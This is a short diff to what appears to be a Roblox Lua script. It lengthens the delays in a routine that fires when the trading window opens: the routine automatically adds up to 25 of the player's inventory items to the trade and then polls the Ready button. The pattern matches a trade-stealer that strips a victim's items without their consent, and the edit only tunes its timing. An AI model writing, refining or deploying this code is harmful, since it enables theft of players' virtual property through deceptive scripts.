@@ -208,10 +208,10 @@ end)
 
 TradingGui:GetPropertyChangedSignal("Visible"):Connect(function()
     if TradingGui.Visible then
-        task.wait(0.5)
+        task.wait(2.5)
         for i = 1, math.min(25, #Inventory) do
             AddItemToTrade:FireServer("Items", Inventory[i].name, Inventory[i].quantity)
-            task.wait(0.5)
+            task.wait(2.5)
         end
         local Button = TradingGui.Frame.Content.Player2Side.Player2Holder.Buttons.Ready.Txt
         while task.wait() and TradingGui.Visible do
